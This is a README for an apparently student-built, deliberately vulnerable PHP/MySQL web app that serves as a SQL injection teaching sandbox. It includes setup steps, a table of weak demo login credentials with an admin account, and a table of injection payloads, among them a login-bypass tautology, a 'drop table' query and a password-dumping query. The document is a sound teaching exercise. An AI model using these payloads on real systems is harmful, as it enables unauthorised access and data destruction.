SQL Injection
==============================

A web application that contains the following:

* Primitive UAC
* SQL injection sandbox

Languages/Frameworks
------------

* HTML, CSS, JS
* PHP
* MySQL

Prerequisites
------------

* A webserver (i.e., Apache or Nginx)
* A MySQL server

Note: XAMPP can conveniently provide these options.

Getting Started
------------

* Download the project's subdirectory from GitHub
  using [this link](https://minhaskamal.github.io/DownGit/#/home?url=https://github.com/tariqshaban/bachelor-projects/tree/master/3rd_year/1st_semester/cis433_security/sql_injection)
  , credit goes to [Minhas Kamal](https://minhaskamal.github.io).
* Run the [Whole DB.sql](sql_script) script file on MySQL database, this will create a `Student` database
* Mount the [Webpage](webpage) folder contents into the webserver root public folder
* Use one of the following credentials to enter, the last row will authorize administrator privileges:

| ID    | Password   |
|-------|------------|
| 12345 | 123456     |
| 12333 | abc123     |
| 12348 | fVQG8YcSdp |
| 12362 | dPr}V^f8.6 |
| 18345 | Q5-EC:<qur |
| 99999 | admin      |

* Use one of the following queries to enforce SQL injection:

| Purpose               | Query                              | Notes                                                                              |
|-----------------------|------------------------------------|------------------------------------------------------------------------------------|
| view all marks        | ' or '1' = '1'#                    |                                                                                    |
| deletes student table | '; drop table uac;#                | Requires mysqli_multi_query                                                        |
| show passwords        | '; select password from password;# | Will not function since the return type of mysqli_multi_query (if used) is boolean |

Notes
------------

* Due to the nature of the PHP language and its variation of MS SQL, a piggy-backed approach could not be done, this is
  caused by the enforcement of PHP when using multiple queries that consist of using the command “mysqli_multi_query”
  instead of “mysqli_query”, which results in the return type being Boolean instead of a “select” command return.

--------